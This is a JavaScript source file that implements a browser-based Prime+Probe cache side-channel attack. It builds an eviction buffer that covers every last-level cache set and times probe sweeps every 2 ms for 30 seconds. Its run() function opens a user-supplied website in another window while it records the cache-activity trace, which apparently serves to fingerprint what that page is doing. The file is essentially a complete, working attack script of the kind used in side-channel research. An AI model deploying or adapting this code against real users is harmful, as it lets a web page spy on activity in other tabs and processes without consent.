const MEASUREMENT_TIME_IN_MS = 30000;

const SAMPLING_PERIOD_IN_MS = 2;
const SET_SKIPPING_STEP = 2;

const CACHE_SETS = 8192;
const CACHE_WAYS = 12; // 8MB on my iMac

const BYTES_PER_MB = 1024 * 1024;
const SETS_PER_PAGE = 64;

const COUNT_SWEEPS = false; // if false, measure time. if true, measure how many cache sweeps we get until the clock changes

// var timer = require("performance-now");
// Prime and probe object
function PrimeProbe(sets, ways) {
    this.evictionArray = new Uint32Array(24 * BYTES_PER_MB / Uint32Array.BYTES_PER_ELEMENT);
    this.setHeads = new Array(SETS_PER_PAGE);

    this.probeSet = function (setOffset) {
        //var elementsWentOver = 0;
        // Go over all elements in the set
        var pointer = this.setHeads[setOffset];
        var listHead = pointer;
        do {
            // elementsWentOver++;
            pointer = this.evictionArray[pointer];
        } while (pointer != listHead);

        // console.log("Went over " + elementsWentOver + " elements.");
        return pointer;
    }

    this.probeSetLimited = function (setOffset, hops) {
        //var elementsWentOver = 0;
        // Go over all elements in the set
        var pointer = this.setHeads[setOffset];
        var listHead = pointer;
        do {
            // elementsWentOver++;
            pointer = this.evictionArray[pointer];
            hops--;
        } while ((hops != 0) && (pointer != listHead));

        // console.log("Went over " + elementsWentOver + " elements.");
        return pointer;
    }

    this.probeSets = function (sets) {
        // Probe some of the sets in the page
        for (setOffset in sets) {
            this.probeSet(sets[setOffset]);
        }
    }

    this.probeAllSets = function () {
        for (var set = 0; set < SETS_PER_PAGE; set += SET_SKIPPING_STEP) {
            this.probeSet(set);
        }
    }

    this.shuffle = function (arrayToShuffle) {
        var tmp, current, top = arrayToShuffle.length;
        if (top)
            while (--top) {
                current = Math.floor(Math.random() * (top + 1));
                tmp = arrayToShuffle[current];
                arrayToShuffle[current] = arrayToShuffle[top];
                arrayToShuffle[top] = tmp;
            }
        return arrayToShuffle;
    }

    this.createSetHeads = function (sets, ways) { //set = 8192, ways = 16
        // We have 64 set heads, each should to a list of size 128*[ways]=1536
        var unshuffledArray = new Uint32Array(sets / SETS_PER_PAGE); //128 pages
        var allSetOffset = Math.log2(sets) + 4; // 17 for sets=8192, 16 for sets=4096

        var i;
        for (i = 0; i < unshuffledArray.length; i++) {
            unshuffledArray[i] = i;
        }

        // Shuffle the array
        var shuffledArray = this.shuffle(unshuffledArray);

        // Now write into the eviction buffer
        // virtual address is:
        // LLL LEEE EEEE SSSS SS00 00[00] (last 2 bits are because of UINT32 vs BYTE)
        //               ^^^^ ^^ - these 6 bits determine the set index, 64 possible values
        //               ^^^^ ^^^^ ^^ ^^ - these 12 bits (4K) are the same in physical and in virtual
        //      ^^^ ^^^^ we keep the set and change these 6/7 bits to 64/128 different values to cover all 8192=128*64 sets
        // ^^^ ^  - we use 12/16 different values for this to touch each set 12/16 times, once per line
        var set_index, element_index, line_index;
        var currentElement, nextElement;
        for (set_index = 0; set_index < SETS_PER_PAGE; set_index++) {//0 to 63, each set in a page
            currentElement = (shuffledArray[0] << 10) + (set_index << 4); //
            this.setHeads[set_index] = currentElement;
            for (line_index = 0; line_index < ways; line_index++) { // 0 to 15, each line
                //currentElement = (line_index << 17) + (shuffledArray[0] << 10) + (set_index << 4);

                for (element_index = 0; element_index < sets / SETS_PER_PAGE - 1; element_index++) { // 0 to 62, other set in a page
                    nextElement = (line_index << allSetOffset) + (shuffledArray[element_index + 1] << 10) + (set_index << 4);
                    this.evictionArray[currentElement] = nextElement;
                    currentElement = nextElement;
                } // element
                if (line_index == ways - 1) {
                    // In the last line, the last pointer goes to the head of the entire set
                    nextElement = this.setHeads[set_index];
                } else {
                    // Last pointer goes back to the head of the next line
                    nextElement = ((line_index + 1) << allSetOffset) + (shuffledArray[0] << 10) + (set_index << 4);
                }
                this.evictionArray[currentElement] = nextElement;
                currentElement = nextElement;
            } // line
        } // set

    };

    this.createSetHeads(sets, ways);

    // check that this doesn't crash/get stuck
    this.probeSets([1, 2, 3, 4, 5]);
} // PP object.

PP = new PrimeProbe(CACHE_SETS, CACHE_WAYS);

var resultArray = new Array(Math.ceil(MEASUREMENT_TIME_IN_MS / SAMPLING_PERIOD_IN_MS));

function performMeasurement() {
    // For each measurement period
    
    var measurement_index, busySpins = 0;
    var nextMeasurementStartTime = performance.now(),
        currentTime;

    nextMeasurementStartTime += SAMPLING_PERIOD_IN_MS;

    // Spin until we're ready for the next measurement
    do {
        currentTime = performance.now();
    }
    while (currentTime < nextMeasurementStartTime);

    for (measurement_index = 0; measurement_index < resultArray.length; measurement_index++) {

        nextMeasurementStartTime += SAMPLING_PERIOD_IN_MS;
        currentTime = performance.now();

        // if we've run out of time, skip the measurement
        if (currentTime >= nextMeasurementStartTime) {
            if (COUNT_SWEEPS == true) {
                resultArray[measurement_index] = 0;
            } else {
                resultArray[measurement_index] = SAMPLING_PERIOD_IN_MS * 3; // Some arbitrarily high value...

            }
        } else {
            if (COUNT_SWEEPS == true) {
                var sweeps = 0;
                // repeatedly perform the measurement until the clock changes
                do {
                    currentTime = performance.now();
                    sweeps++;
                    PP.probeAllSets();
                } while (currentTime < nextMeasurementStartTime);
            } else {
                // otherwise, perform the measurement
                PP.probeAllSets();
            }
            // log how many spins it took until the clock ticked again
            if (COUNT_SWEEPS == true) {
                // log how many spins it took until the clock ticked again
                resultArray[measurement_index] = sweeps;
            } else {
                resultArray[measurement_index] = performance.now() - currentTime;
            }
            // Prepare for the next measurement
            do {
                currentTime = performance.now();
            }
            while (currentTime < nextMeasurementStartTime);
        }
    }

    document.write(resultArray);
}
function run(){
//    window.open("https://www.oracle.com/");
//    window.open("https://www.wikipedia.org/");
//    window.open("https://www.youtube.com/");
//    window.open("https://www.amazon.com/");
    var x = document.getElementById("address").value;
    window.open(x);
    performMeasurement();
}
document.getElementById("clickMe").onclick = run;